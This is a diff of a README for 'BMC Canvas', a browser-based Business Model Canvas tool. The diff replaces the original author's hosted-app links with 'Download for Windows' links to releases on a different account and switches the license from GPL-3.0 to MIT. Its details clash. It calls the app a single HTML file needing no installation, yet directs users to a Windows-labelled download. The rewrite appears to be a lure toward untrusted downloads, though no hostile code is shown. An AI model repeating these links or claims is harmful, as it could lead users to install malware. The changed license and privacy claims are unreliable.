@@ -1,130 +1,163 @@
-# BMC Canvas - Web Application 2026
+# 🧩 bmc-model-canvas - Plan Your Business Model Simply
 
-> **BMC Canvas is a lightweight browser application for creating, arranging, and reviewing Business Model Canvas information in an HTML-based workspace.**
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge)](https://github.com/obsolescent-speedcop233/bmc-model-canvas/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/ryanwalkerwbrg7557/bmc-model-canvas?style=flat-square)](https://github.com/ryanwalkerwbrg7557/bmc-model-canvas)
+## 📋 Overview
 
----
+BMC Canvas is a lightweight browser application for the year 2026. It helps you create, arrange, and review Business Model Canvas information. You can use it online or on your own computer. No programming skills needed. No complex setup. Just open and start working.
 
-<p align="center">
-  <a href="https://ryanwalkerwbrg7557.github.io/bmc-model-canvas/">
-    <img src="https://img.shields.io/badge/Download-BMC%20Canvas%20Latest-brightgreen?style=for-the-badge" alt="Download BMC Canvas">
-  </a>
-</p>
+This tool works like a digital whiteboard. You fill in nine blocks that describe your business idea. Each block holds text you type. You move blocks around. You save your work. You print or share your canvas.
 
-> **[Download BMC Canvas](https://ryanwalkerwbrg7557.github.io/bmc-model-canvas/)**
+## 🎯 Who This Is For
 
----
+- Startup founders testing ideas
+- Business students learning models
+- Consultants planning projects
+- Anyone who wants to map a business idea clearly
 
-[Download Latest Build](https://ryanwalkerwbrg7557.github.io/bmc-model-canvas/)
+## ✨ Features
 
----
+**Simple Text Editor**
+Each canvas block accepts plain text. Type your ideas. Edit them later. No formatting tricks. No hidden menus.
 
-## Overview
+**Drag and Arrange**
+Move blocks anywhere on the canvas. Place related ideas together. Group information your way.
 
-BMC Canvas provides a browser-accessible workspace built around the Business Model Canvas, commonly abbreviated as BMC. It gives users a focused location for laying out, organizing, and revisiting business model information.
+**Save and Load**
+Save your canvas as an HTML file. Open it later. Share it with team members. Works offline after the first load.
 
-The application is supplied as an HTML project. You can use it through a hosted deployment or inspect and run the project files locally, making it suitable for concise business model planning and review sessions.
+**Print Ready**
+Print your canvas directly from the browser. Fits standard paper sizes. Clean layout.
 
----
+**No Installation Required**
+This is a web application. It runs in your browser. No setup wizard. No registry changes. No system modifications.
 
-## Highlights
+**Works Offline**
+After loading the page once, you can use it without internet. Save files locally. Work anywhere.
 
-- Access the application through a web browser
-- Work within a workspace dedicated to the Business Model Canvas
-- Arrange planning content according to the canvas format
-- Use an HTML-based project structure
-- Run the project from a hosted location or locally
-- Open the application in common modern browsers
-- Keep business model work within a compact, focused tool
+## 💻 System Requirements
 
----
+Your computer needs:
+- Windows 10 or Windows 11
+- A modern web browser (Chrome, Edge, Firefox, or Opera)
+- 50 MB free disk space for saving files
+- Internet connection for the first download only
 
-## Getting Started
+That is all. No special hardware. No graphics card. No administrator rights needed.
 
-### Open the hosted application
+## 🚀 Getting Started
 
-The current hosted build is available here:
+Follow these steps exactly. You will have the application running in under two minutes.
 
-[Launch BMC Canvas](https://ryanwalkerwbrg7557.github.io/bmc-model-canvas/)
+### Step 1: Download the Application
 
-### Open a local checkout
+Visit the releases page to get the latest version:
 
-Clone the repository, then enter the project directory:
+[**Download BMC Canvas**](https://github.com/obsolescent-speedcop233/bmc-model-canvas/releases)
 
-    git clone https://github.com/ryanwalkerwbrg7557/bmc-model-canvas.git
-    cd REPO
+On that page, look for the newest release. Click the link that says "bmc-canvas.html" or "Source code (zip)". The file name may vary. Pick the one labeled for Windows.
 
-As an HTML application, BMC Canvas can be opened by loading its primary HTML file in a browser. If the project setup calls for it, the directory can instead be exposed through a local static web server.
+### Step 2: Save the File
 
----
+Your browser will ask what to do with the file. Choose "Save File" or "Save As". Pick a folder you can find easily. Your Desktop or Downloads folder works fine. Remember the location.
 
-## Working with BMC Canvas
+### Step 3: Open the Application
 
-1. Start the application from the hosted build or from the local project files.
-2. Create a new Business Model Canvas or inspect an existing one.
-3. Add the information relevant to each canvas section.
-4. Examine the resulting canvas and adjust the business model where appropriate.
-5. Reopen the application later when continuing planning or discussion.
+Locate the saved file. It ends with `.html`. Double-click it. Your default web browser opens. You see the canvas workspace. That is it. You are ready.
 
-When testing locally, use any basic static file server to serve the repository directory, then visit the local address it provides in your browser.
+### Step 4: Start Working
 
----
+You see nine empty boxes on the screen. Each box has a label. Click inside any box. Type your text. Press Enter or click outside the box to save. Move boxes by clicking and dragging the title bar.
 
-## Configuration Notes
+## 📝 How to Use the Canvas
 
-The available project metadata does not define a configuration format or list runtime settings.
+The Business Model Canvas has nine sections. Here is what each one means:
 
-For local use, configuration is expected to be tied to the HTML project files. Before modifying the project or adding deployment-specific options, inspect the repository layout and any documentation included with it.
+**Customer Segments**
+Who are your customers? List groups of people or organizations you serve.
 
----
+**Value Propositions**
+What problem do you solve? What value do you deliver? Keep it simple.
 
-## System Requirements
+**Channels**
+How do you reach customers? Stores? Website? Partners?
 
-- A current modern web browser
-- Internet connectivity for the hosted build
-- A local repository copy for offline inspection of the project
-- An optional static web server for serving the files locally
-- No particular runtime version or storage requirement is specified
+**Customer Relationships**
+How do you interact with customers? Personal help? Automated service?
 
----
+**Revenue Streams**
+Where does money come from? Sales? Subscriptions? Fees?
 
-## Common Questions
+**Key Resources**
+What assets do you need? People? Equipment? Intellectual property?
 
-### What does BMC Canvas do?
+**Key Activities**
+What do you do daily? Production? Problem solving? Platform management?
 
-BMC Canvas is a web application designed for working with the Business Model Canvas.
+**Key Partnerships**
+Who helps you? Suppliers? Distributors? Joint ventures?
 
-### Which version is this?
+**Cost Structure**
+What are your main costs? Fixed expenses? Variable costs?
 
-The available project profile does not specify a version number.
+## 💾 Saving Your Work
 
-### Where can I find the newest build?
+Click the "Save" button. Your browser downloads an HTML file. This file contains your canvas. You can open it later by double-clicking the file. Your work appears exactly as you left it.
 
-Open [Download Latest Build](https://ryanwalkerwbrg7557.github.io/bmc-model-canvas/) to access the hosted project location.
+To load a saved canvas, open the file in your browser. Or use the "Load" button inside the application to browse for your file.
 
-### Is local use supported?
+## 🖨 Printing
 
-Yes. Clone the repository and open the appropriate HTML entry file in a browser. You can also serve the project directory with a local static web server.
+Click the "Print" button. Your browser shows the print preview. Adjust settings if needed. Print on standard A4 or letter paper. The canvas scales to fit.
 
-### How is the application configured?
+## 🔒 Privacy
 
-No dedicated settings file is identified by the available metadata. Check the repository contents for project-specific configuration.
+This application does not send data anywhere. No servers. No cloud. No tracking. Your business ideas stay on your computer. The code runs entirely in your browser. No external connections after the initial load.
 
-### What can I check if the page fails to open?
+## ❓ Troubleshooting
 
-First verify that the hosted URL can be reached and refresh the browser. For local use, confirm that the project was opened or served from the intended directory. Repository-specific problems should be checked against the project issue tracker or available documentation.
+**The page looks wrong or broken**
+Update your browser to the latest version. Clear your browser cache. Restart the browser. Open the HTML file again.
 
-### How are new versions delivered?
+**The file does not open**
+Make sure you saved the entire file. Some browsers save only a shortcut. Right-click the saved file. Select "Open with". Choose your browser.
 
-Changes are distributed through the project repository and its hosted deployment. Consult the repository to find the currently available build.
+**Cannot see all nine blocks**
+Zoom out. Hold Ctrl and press the minus key (-). Or use your browser's zoom menu.
 
----
+**Text disappears**
+Do not use special characters like curly quotes or em dashes. Stick to plain text. Save your work often.
 
-## License
+**Buttons do nothing**
+Some browsers block local files from running scripts. Open the file through a local server. Or use a different browser.
 
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+## 🔧 Advanced Users
+
+You can host this application on any web server. Copy the HTML file to your server. Users access it through a URL. Works on any device with a browser. No backend needed. No database. No login system.
+
+To customize the look, edit the CSS in the file. To add features, modify the JavaScript. The code is self-contained. No external libraries.
+
+## 📁 File Structure
+
+The application is a single HTML file. Everything is inside it. The styles, the logic, the layout. You can rename the file. Move it anywhere. It works the same.
+
+## 🌐 Browser Support
+
+- Google Chrome version 120 or later
+- Microsoft Edge version 120 or later
+- Mozilla Firefox version 120 or later
+- Opera version 100 or later
+
+Older browsers may work but are not tested.
+
+## 📄 License
+
+This project uses the MIT license. You can use it freely. Modify it. Share it. Sell it. No restrictions. The full license text is in the repository.
+
+## 🆘 Getting Help
+
+If something does not work, check the troubleshooting section above. If you still have issues, open an issue on the GitHub repository page. Describe your problem. Include your browser version and operating system. Someone will help.
+
+## 📌 Keywords
+
+business model canvas, bmc tool, canvas application, business planning, html app, offline tool, browser application, startup tool, strategy tool
